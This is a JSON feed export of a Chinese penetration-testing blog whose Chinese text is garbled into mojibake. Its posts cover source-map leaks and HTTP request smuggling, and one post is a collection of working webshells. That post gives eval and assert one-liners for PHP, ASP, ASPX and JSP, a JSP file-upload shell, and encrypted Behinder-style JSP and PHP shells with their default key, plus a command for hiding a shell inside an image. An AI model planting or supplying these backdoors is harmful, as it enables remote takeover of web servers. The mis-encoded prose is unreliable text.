{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0çš„ç§˜å¯†èŠ±å›­ â€¢ All posts by \"æ¸—é€åŸºç¡€\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/",
            "url": "http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/",
            "title": "redisæœªæˆæƒéªŒè¯æµç¨‹",
            "date_published": "2022-01-16T03:14:59.000Z",
            "content_html": "<h1 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h1>\n",
            "tags": [
                "redis,æœªæˆæƒ,æ¼æ´åˆ©ç”¨"
            ]
        },
        {
            "id": "http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/",
            "url": "http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/",
            "title": "sourcemapæ³„éœ²è·å–å‰ç«¯æºç ",
            "date_published": "2021-12-03T03:20:41.000Z",
            "content_html": "<p>reverse-sourcemap ä¸‹è½½åœ°å€:<a href=\"https://github.com/davidkevork/reverse-sourcemap\">https://github.com/davidkevork/reverse-sourcemap</a></p>\n<ol>\n<li>\n<p>å®‰è£… nodejs</p>\n<p><code>apt install npm</code></p>\n</li>\n<li>\n<p>reverse-sourcemap</p>\n<p><code>npm install --global reverse-sourcemap</code></p>\n</li>\n<li>\n<p>ä½¿ç”¨.js.map æ–‡ä»¶è·å–å‰ç«¯æºç </p>\n<p><code> reverse-sourcemap -v xxx.js.map -o output</code></p>\n<p><img src=\"1.png\" alt=\"\"></p>\n</li>\n</ol>\n",
            "tags": [
                "å‰åç«¯åˆ†ç¦»"
            ]
        },
        {
            "id": "http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/",
            "url": "http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/",
            "title": "ä¸€å¥è¯æœ¨é©¬æ•´ç†",
            "date_published": "2021-08-12T02:53:49.000Z",
            "content_html": "<h1 id=\"æ—¥å¸¸ç³»åˆ—\"><a class=\"markdownIt-Anchor\" href=\"#æ—¥å¸¸ç³»åˆ—\">#</a> æ—¥å¸¸ç³»åˆ—</h1>\n<h2 id=\"phtml\"><a class=\"markdownIt-Anchor\" href=\"#phtml\">#</a> phtml</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;milkii0&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php\"><a class=\"markdownIt-Anchor\" href=\"#php\">#</a> php</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> assert(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]);<span class=\"meta\">?&gt;</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;O&gt;h=@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]);&lt;/O&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"asp\"><a class=\"markdownIt-Anchor\" href=\"#asp\">#</a> asp</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%execute(request(&quot;milkii0&quot;))%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%execute request(&quot;milkii0&quot;)%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%eval request(&quot;milkii0&quot;)%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"aspx\"><a class=\"markdownIt-Anchor\" href=\"#aspx\">#</a> aspx</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; %&gt;</span><br><span class=\"line\">&lt;%eval(Request.Item[&quot;milkii0&quot;]);%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; validateRequest=&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;milkii0&quot;],&quot;unsafe&quot;));%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jsp\"><a class=\"markdownIt-Anchor\" href=\"#jsp\">#</a> jsp</h2>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span>(request.getParameter(<span class=\"string\">&quot;file_name&quot;</span>)!=<span class=\"keyword\">null</span>)(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> java.io.FileOutputStream(application.getRealPath(<span class=\"string\">&quot;/&quot;</span>)+request.getParameter(<span class=\"string\">&quot;file_name&quot;</span>))).write(request.getParameter(<span class=\"string\">&quot;file_content&quot;</span>).getBytes()</span><br><span class=\"line\">);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"å†°èç³»åˆ—\"><a class=\"markdownIt-Anchor\" href=\"#å†°èç³»åˆ—\">#</a> å†°èç³»åˆ—</h1>\n<h2 id=\"jsp-2\"><a class=\"markdownIt-Anchor\" href=\"#jsp-2\">#</a> jsp</h2>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@page</span> <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">U</span> <span class=\"keyword\">extends</span> <span class=\"title\">ClassLoader</span></span>&#123;</span><br><span class=\"line\">    U(ClassLoader c)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Class <span class=\"title\">g</span><span class=\"params\">(<span class=\"keyword\">byte</span> []b)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.defineClass(b,<span class=\"number\">0</span>,b.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span> (request.getMethod().equals(<span class=\"string\">&quot;POST&quot;</span>))&#123;</span><br><span class=\"line\">    String k=<span class=\"string\">&quot;e45e329feb5d925b&quot;</span>;<span class=\"comment\">/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/</span></span><br><span class=\"line\">    session.putValue(<span class=\"string\">&quot;u&quot;</span>,k);</span><br><span class=\"line\">    Cipher c=Cipher.getInstance(<span class=\"string\">&quot;AES&quot;</span>);</span><br><span class=\"line\">    c.init(<span class=\"number\">2</span>,<span class=\"keyword\">new</span> SecretKeySpec(k.getBytes(),<span class=\"string\">&quot;AES&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">new</span> U(<span class=\"keyword\">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class=\"keyword\">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php-2\"><a class=\"markdownIt-Anchor\" href=\"#php-2\">#</a> php</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">    <span class=\"variable\">$key</span>=<span class=\"string\">&quot;e45e329feb5d925b&quot;</span>; <span class=\"comment\">//è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span></span><br><span class=\"line\">\t<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;k&#x27;</span>]=<span class=\"variable\">$key</span>;</span><br><span class=\"line\">\tsession_write_close();</span><br><span class=\"line\">\t<span class=\"variable\">$post</span>=file_get_contents(<span class=\"string\">&quot;php://input&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">&#x27;openssl&#x27;</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$t</span>=<span class=\"string\">&quot;base64_&quot;</span>.<span class=\"string\">&quot;decode&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$post</span>=<span class=\"variable\">$t</span>(<span class=\"variable\">$post</span>.<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;strlen(<span class=\"variable\">$post</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    \t\t\t <span class=\"variable\">$post</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$post</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$key</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>]; </span><br><span class=\"line\">    \t\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$post</span>=openssl_decrypt(<span class=\"variable\">$post</span>, <span class=\"string\">&quot;AES128&quot;</span>, <span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"variable\">$arr</span>=explode(<span class=\"string\">&#x27;|&#x27;</span>,<span class=\"variable\">$post</span>);</span><br><span class=\"line\">    <span class=\"variable\">$func</span>=<span class=\"variable\">$arr</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"variable\">$params</span>=<span class=\"variable\">$arr</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span></span>&#123;<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"><span class=\"variable\">$p</span></span>) </span>&#123;<span class=\"keyword\">eval</span>(<span class=\"variable\">$p</span>.<span class=\"string\">&quot;&quot;</span>);&#125;&#125;</span><br><span class=\"line\">    @call_user_func(<span class=\"keyword\">new</span> C(),<span class=\"variable\">$params</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"å›¾ç‰‡é©¬åˆæˆå‘½ä»¤\"><a class=\"markdownIt-Anchor\" href=\"#å›¾ç‰‡é©¬åˆæˆå‘½ä»¤\">#</a> å›¾ç‰‡é©¬åˆæˆå‘½ä»¤</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 1.jpg+1.php 2.jpg</span><br></pre></td></tr></table></figure>\n<p><img src=\"2.jpg\" alt=\"\"></p>\n",
            "tags": [
                "æœ¨é©¬,æ±‡æ€»"
            ]
        },
        {
            "id": "http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/",
            "url": "http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/",
            "title": "HTTPè¯·æ±‚èµ°ç§ç®€è¿°",
            "date_published": "2021-08-03T02:20:54.000Z",
            "content_html": "<h1 id=\"httpè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ\"><a class=\"markdownIt-Anchor\" href=\"#httpè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ\">#</a> HTTP è¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ</h1>\n<p>HTTP è¯·æ±‚èµ°ç§ï¼Œä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†æ¥è‡ªç”¨æˆ·çš„ HTTP <ins class=\"wavy\">è¯·æ±‚åºåˆ—</ins> çš„æŠ€æœ¯</p>\n<h2 id=\"ç›¸å…³çŸ¥è¯†ç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#ç›¸å…³çŸ¥è¯†ç‚¹\">#</a> ç›¸å…³çŸ¥è¯†ç‚¹</h2>\n<p>è¯¥æ¼æ´çš„äº§ç”Ÿä¸»è¦å’Œ HTTP è¯·æ±‚ä¸­çš„ä¸¤ä¸ªå¤´ç›¸å…³ï¼š</p>\n<p><span class=\"spoiler\" title=\"...\">Transfer_Encoding</span>  &amp; <span class=\"spoiler\" title=\"...\">Content-Length</span></p>\n<h3 id=\"transfer-encoding\"><a class=\"markdownIt-Anchor\" href=\"#transfer-encoding\">#</a> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding\">Transfer-Encoding</a></h3>\n<p>Transfer-Encoding é€šç”¨æ ‡å¤´å­—æ®µæŒ‡ç¤ºå·²å¯¹æ¶ˆæ¯æ­£æ–‡åº”ç”¨äº†ä»€ä¹ˆï¼ˆå¦‚æœæœ‰ï¼‰ç±»å‹çš„è½¬æ¢ï¼Œä»¥ä¾¿åœ¨å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“å®ƒï¼Œåœ¨ HTTP1.1 ä¸­å¯ç”¨</p>\n<p>åˆ©ç”¨è¯¥æ¼æ´ï¼Œéœ€æŒ‡å®šå‚æ•°ä¸º chunked  <code> Transfer-Encoding: chunked</code> ï¼Œè¡¨ç¤ºæ•°æ®ä»¥ä¸€ç³»åˆ—å—å‘é€ï¼Œè€Œä¸æ˜¯ç­‰åˆ°å®Œæ•´çš„æ®µå¯ç”¨</p>\n<p>åœ¨ CTE ä¸­ï¼Œæ¯ä¸ªå—å‰é¢éƒ½æœ‰å®ƒçš„å¤§å°ï¼ˆå­—èŠ‚ä¸ºå•ä½ï¼‰</p>\n<p>å½“æ¥æ”¶åˆ°é›¶é•¿åº¦å—æ—¶ï¼ˆä¸å¯çœç•¥ï¼‰ï¼Œä¼ è¾“ç»“æŸ</p>\n<p>âœ‹ğŸŒ°</p>\n<figure class=\"highlight plaintext\"><figcaption><span>æ•°æ®åŒ…å–”</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK </span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">5\\r\\n</span><br><span class=\"line\">Media\\r\\n</span><br><span class=\"line\">8\\r\\n</span><br><span class=\"line\">Services\\r\\n</span><br><span class=\"line\">4\\r\\n</span><br><span class=\"line\">Live\\r\\n</span><br><span class=\"line\">0\\r\\n</span><br><span class=\"line\">\\r\\n</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€éƒ¨åˆ†ï¼š å½“å‰ç»„å—é•¿åº¦ï¼ˆ16 è¿›åˆ¶ï¼‰+ \\r\\n</p>\n<p>ç¬¬äºŒéƒ¨åˆ†ï¼š å—å†…å®¹ + \\r\\n</p>\n<p>ï¼ˆä¾‹å¦‚ Media å°±æ˜¯ 5 ä¸ªå­—èŠ‚é•¿åº¦ï¼‰</p>\n<p>å€’æ•°ç¬¬äºŒéƒ¨åˆ†ï¼š ç»ˆæ­¢å— -&gt; åˆ†å—ç¼–ç ä»¥ä»»ä½•å¤§å°ä¸ºé›¶çš„å—ç»“æŸï¼Œé•¿åº¦ä¸º 0 -&gt; 0\\r\\n</p>\n<p>æœ€åä¸€éƒ¨åˆ†ï¼š ä»¥ç©ºè¡Œç»ˆæ­¢ï¼ˆ\\r\\nï¼‰</p>\n<h3 id=\"content-length\"><a class=\"markdownIt-Anchor\" href=\"#content-length\">#</a> Content-Length</h3>\n<p>è¯¥å­—æ®µæŒ‡ç¤ºå‘é€ç»™æ¥å—è€…çš„å®ä½“ä¸»ä½“çš„å¤§å°ï¼Œä»¥åè¿›åˆ¶çš„ OCTET æ•°è¡¨ç¤º</p>\n<p>è¿™ä¸ªå¯ä»¥è‡ªå·±ç”¨ burp å‘åŒ…è¯•è¯•å“¦ï¼Œbp çš„ repeat é€‰é¡¹ä¸­é»˜è®¤å¼€å¯äº† Update Content-Length é€‰é¡¹</p>\n<h3 id=\"æ³¨æ„connection\"><a class=\"markdownIt-Anchor\" href=\"#æ³¨æ„connection\">#</a> â­æ³¨æ„ Connection</h3>\n<blockquote>\n<p>æ¯å½“ä¼ è¾“ç¼–ç åº”ç”¨äºæ¶ˆæ¯ä½“æ—¶ï¼Œä¼ è¾“ç¼–ç é›†å¿…é¡»åŒ…æ‹¬ â€œåˆ†å—â€ï¼Œé™¤éæ¶ˆæ¯å› å…³é—­è¿æ¥è€Œç»ˆæ­¢</p>\n<p>â€”â€”<a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.6\">HTTP/1.1: Protocol Parameters</a></p>\n</blockquote>\n<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è¿æ¥å…³é—­æ—¶ï¼Œä¹Ÿä¼šå¯¼è‡´æ¶ˆæ¯ç»ˆæ­¢</p>\n<p>é‚£ä¹ˆæˆ‘ä»¬åœ¨å‘é€æ•°æ®åŒ…æ—¶ï¼Œå°±éœ€è¦æ³¨æ„ <ins>Connection</ins> å¤´</p>\n<p>Connection: keep-alive -&gt; è¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›ä¿æŒè¿æ¥æ‰“å¼€ï¼Œæ‹¥æœ‰æŒä¹…è¿æ¥æ˜¯ HTTP/1.1 è¯·æ±‚çš„é»˜è®¤è®¾ç½®</p>\n<p>Connection: close -&gt; è¡¨ç¤ºå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨æƒ³è¦å…³é—­è¿æ¥ï¼Œè¿™æ˜¯ HTTP/1.0 è¯·æ±‚çš„é»˜è®¤è®¾ç½®</p>\n<h1 id=\"httpè¯·æ±‚èµ°ç§çš„åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#httpè¯·æ±‚èµ°ç§çš„åŸç†\">#</a> HTTP è¯·æ±‚èµ°ç§çš„åŸç†</h1>\n<p>ç°å¾ˆå¤šåº”ç”¨ç¨‹åºä½¿ç”¨ HTTP æœåŠ¡é“¾ï¼ˆ2 ä¸ªæˆ–å¤šä¸ªæœåŠ¡å™¨ï¼‰</p>\n<p>å…¶ä¸­å‰ç«¯æœåŠ¡å™¨æœ‰æ—¶ç§°ä¸ºè´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†</p>\n<p><img src=\"1.png\" alt=\"burpå›¾ç‰‡å“¦\"></p>\n<p>è¿™æ—¶ï¼Œè‹¥å‰ç«¯åç«¯ç³»ç»Ÿå°±è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œæ²¡æœ‰è¾¾æˆä¸€è‡´ï¼Œå°±å¯ä»¥å‘é€ä¸€ä¸ªæ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚ï¼Œè®©å‰ç«¯å’Œåç«¯ç³»ç»Ÿå¯¹è¯¥è¯·æ±‚è¿›è¡Œä¸åŒçš„è§£é‡Š</p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>ğŸ‘‡ğŸ‘‡ğŸ‘‡</p>\n<p>ç”±äº HTTP è§„èŒƒæä¾›äº†ä¸¤ç§æ–¹æ³•æŒ‡å®šæ¶ˆæ¯é•¿åº¦ï¼ˆContent-Length&amp;Transform-Encodingï¼‰ï¼Œæ‰€ä»¥å•ä¸ªæ¶ˆæ¯â€‹åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ—¶ï¼Œä¸åŒçš„æœåŠ¡å™¨å¯èƒ½å‡ºç°ä¸åŒçš„è§£é‡Š</p>\n<p>å¦‚æœæ¶ˆæ¯å¤´ä»¥æŸç§æ–¹å¼æ¨¡ç³Šäº†ï¼Œåˆ™å¯ä»¥è¯±å¯¼æ¶ˆæ¯å¤´ä¸å¤„ç†å®ƒ</p>\n<p>ğŸ‘†ğŸ‘†ğŸ‘†</p>\n<h1 id=\"httpè¯·æ±‚èµ°ç§åˆ©ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#httpè¯·æ±‚èµ°ç§åˆ©ç”¨\">#</a> HTTP è¯·æ±‚èµ°ç§åˆ©ç”¨</h1>\n<p>è¯·æ±‚èµ°ç§å¤§è‡´åˆ†ä¸º 3ï¸âƒ£ç§ç±»å‹</p>\n<ul>\n<li><a href=\"http://CL.ET\">CL.ET</a> -&gt; å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Lengthï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding</li>\n<li><a href=\"http://TE.CL\">TE.CL</a> -&gt; å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encodingï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length</li>\n<li>TE.TE -&gt; å‰åç«¯å‡ä½¿ç”¨ Transfer-Encodingï¼Œä½†å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨å¯è¢«æŸç§æ–¹å¼è¯±å¯¼ä¸å¤„ç†è¯¥å¤´éƒ¨å­—æ®µ</li>\n</ul>\n<h2 id=\"å®éªŒç¯å¢ƒ\"><a class=\"markdownIt-Anchor\" href=\"#å®éªŒç¯å¢ƒ\">#</a> <a href=\"https://portswigger.net/web-security/request-smuggling\">å®éªŒç¯å¢ƒ</a></h2>\n<p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä¸€ç›´æ²¡åŠæ³•æ³¨å†Œ portswiggerï¼Œåªèƒ½åˆ†æä¸€ä¸‹ç»™å‡ºçš„ä¾‹å­äº†</p>\n<h3 id=\"clet\"><a class=\"markdownIt-Anchor\" href=\"#clet\">#</a> <a href=\"http://CL.ET\">CL.ET</a></h3>\n<p>æ”»å‡»æ•°æ®åŒ…</p>\n<figure class=\"highlight plaintext\"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: vulnerable-website.com</span><br><span class=\"line\">Content-Length: 13</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\"></span><br><span class=\"line\">0</span><br><span class=\"line\"></span><br><span class=\"line\">SMUGGLED</span><br></pre></td></tr></table></figure>\n<p>æ•°æ®åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æŒ‡å®šæ¶ˆæ¯é•¿åº¦</p>\n<p>ğŸ€å‰æœåŠ¡å™¨å¤„ç† Content-Length å¤´ï¼Œè®¤ä¸ºè¯·æ±‚ä¸»ä½“ä¸º 13 å­—èŠ‚ï¼Œåˆšå¥½è‡³ smuggled æœ«å°¾ï¼Œå†å°†æ¶ˆæ¯è½¬å‘è‡³åç«¯æœåŠ¡å™¨</p>\n<p>ğŸ€åæœåŠ¡å™¨å¤„ç† Transfer-Encoding å¤´ï¼Œç”±ä¸Šè¿° Transfer-Encoding çŸ¥è¯†ç‚¹å¯çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªç»ˆæ­¢å—ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ smuggled ä¸ä¼šè¢«å¤„ç†ï¼Œåç«¯æœåŠ¡å™¨ä¼šå°† smuggled æ‹¼æ¥è‡³ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹</p>\n<h3 id=\"tecl\"><a class=\"markdownIt-Anchor\" href=\"#tecl\">#</a> <a href=\"http://TE.CL\">TE.CL</a></h3>\n<p>ç±»ä¼¼ CL.TE</p>\n<figure class=\"highlight plaintext\"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: vulnerable-website.com</span><br><span class=\"line\">Content-Length: 3</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\"></span><br><span class=\"line\">8</span><br><span class=\"line\">SMUGGLED</span><br><span class=\"line\">0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ï¼ˆâ­burp ä¸Šæ–¹ repeater é€‰é¡¹å–æ¶ˆ Update Content-Lengthï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæ ¹æ®å®ä½“é•¿åº¦è‡ªåŠ¨æ›´æ–° Content-Length å¤´ï¼‰</p>\n<p>ğŸ€å‰æœåŠ¡å™¨å¤„ç† Transfer-Encoding å¤´ï¼Œç¬¬ä¸€å— 8 ä¸ªå­—èŠ‚ï¼Œç¬¬äºŒå—ä¸ºç»ˆæ­¢å—ï¼Œè¯·æ±‚ç»ˆæ­¢ï¼Œè¯·æ±‚è½¬å‘è‡³åç«¯æœåŠ¡å™¨</p>\n<p>ğŸ€åæœåŠ¡å™¨å¤„ç† Content-Length å¤´ï¼Œå®ä½“é•¿åº¦ä¸º 3ï¼Œé‚£ä¹ˆä» S å¼€å§‹çš„å†…å®¹ï¼Œéƒ½å°†è¢«è§†ä¸ºåºåˆ—ä¸­ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹</p>\n<h3 id=\"tete\"><a class=\"markdownIt-Anchor\" href=\"#tete\">#</a> TE.TE</h3>\n<p>æ··æ·† Transfer-Encoding å¤´çš„æ–¹å¼å¾ˆå¤šï¼Œä¾‹å¦‚</p>\n<ul>\n<li>Transfer-Encoding: 